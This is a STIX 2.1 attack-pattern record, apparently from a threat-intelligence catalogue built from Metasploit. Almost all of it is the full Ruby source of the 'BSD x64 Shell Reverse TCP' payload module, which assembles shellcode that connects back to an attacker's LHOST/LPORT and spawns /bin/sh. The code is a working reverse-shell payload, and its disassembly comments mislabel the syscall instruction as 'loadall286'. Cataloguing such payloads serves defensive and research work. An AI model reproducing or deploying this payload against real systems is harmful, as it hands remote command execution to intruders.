{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6bcfe4cd-014a-40cc-9d57-1ed60e0d14a7",
    "created": "2024-08-14T16:33:19.413126Z",
    "modified": "2024-08-14T16:33:19.41313Z",
    "name": "BSD x64 Shell Reverse TCP",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/bsd/x64/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 98\n\n  include Msf::Payload::Single\n  include Msf::Payload::Bsd\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'BSD x64 Shell Reverse TCP',\n      'Description'   => 'Connect back to attacker and spawn a command shell',\n      'Author'        => [\n        'nemo <nemo[at]felinemenace.org>',\n        'joev' # copy pasta monkey\n      ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'bsd',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix\n    ))\n\n    # exec payload options\n\n    register_options(\n      [\n        OptString.new('CMD',   [ true,  \"The command string to execute\", \"/bin/sh\" ]),\n        Opt::LHOST,\n        Opt::LPORT(4444)\n    ])\n  end\n\n  # build the shellcode payload dynamically based on the user-provided CMD\n  def generate(_opts = {})\n    lhost = datastore['LHOST'] || '127.0.0.1'\n\n    # OptAddress allows either an IP or hostname, we only want IPv4\n    if not Rex::Socket.is_ipv4?(lhost)\n      raise ArgumentError, \"LHOST must be in IPv4 format.\"\n    end\n\n    cmd  = (datastore['CMD'] || '') + \"\\x00\"\n    port = [datastore['LPORT'].to_i].pack('n')\n    ipaddr = [lhost.split('.').inject(0) {|t,v| (t << 8 ) + v.to_i}].pack(\"N\")\n\n    call = \"\\xe8\" + [cmd.length].pack('V')\n    payload =\n      \"\\x31\\xc0\" +                                 # xor eax,eax\n      \"\\x83\\xc0\\x61\" +                             # add eax,0x61\n      \"\\x6A\\x02\" +                                 # push byte +0x2\n      \"\\x5F\" +                                     # pop rdi\n      \"\\x6A\\x01\" +                                 # push byte +0x1\n      \"\\x5E\" +                                     # pop rsi\n      \"\\x48\\x31\\xD2\" +                             # xor rdx,rdx\n      \"\\x0F\\x05\" +                                 # loadall286\n      \"\\x49\\x89\\xC4\" +                             # mov r12,rax\n      \"\\x48\\x89\\xC7\" +                             # mov rdi,rax\n      \"\\x31\\xc0\" +                                 # xor eax,eax\n      \"\\x83\\xc0\\x62\" +                             # add eax,0x62\n      \"\\x48\\x31\\xF6\" +                             # xor rsi,rsi\n      \"\\x56\" +                                     # push rsi\n      \"\\x48\\xBE\\x00\\x02\" + port +                  # mov rsi,0x100007fb3150200\n      ipaddr +\n      \"\\x56\" +                                     # push rsi\n      \"\\x48\\x89\\xE6\" +                             # mov rsi,rsp\n      \"\\x6A\\x10\" +                                 # push byte +0x10\n      \"\\x5A\" +                                     # pop rdx\n      \"\\x0F\\x05\" +                                 # loadall286\n      \"\\x4C\\x89\\xE7\" +                             # mov rdi,r12\n      \"\\x6A\\x03\" +                                 # push byte +0x3\n      \"\\x5E\" +                                     # pop rsi\n      \"\\x48\\xFF\\xCE\" +                             # dec rsi\n      \"\\x6A\\x5A\" +                                 # push +byte 0x5a\n      \"\\x58\" +                                     # pop rax\n      \"\\x0F\\x05\" +                                 # loadall286\n      \"\\x75\\xF6\" +                                 # jne -0x8\n      \"\\x31\\xc0\" +                                 # xor eax,eax\n      \"\\x83\\xc0\\x3B\" +                             # add eax,0x3b\n      call +                                       # call CMD.len\n      cmd +                                        # CMD\n      \"\\x48\\x8B\\x3C\\x24\" +                         # mov rdi,[rsp]\n      \"\\x48\\x31\\xD2\" +                             # xor rdx,rdx\n      \"\\x52\" +                                     # push rdx\n      \"\\x57\" +                                     # push rdi\n      \"\\x48\\x89\\xE6\" +                             # mov rsi,rsp\n      \"\\x0F\\x05\"                                   # loadall286\n  end\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}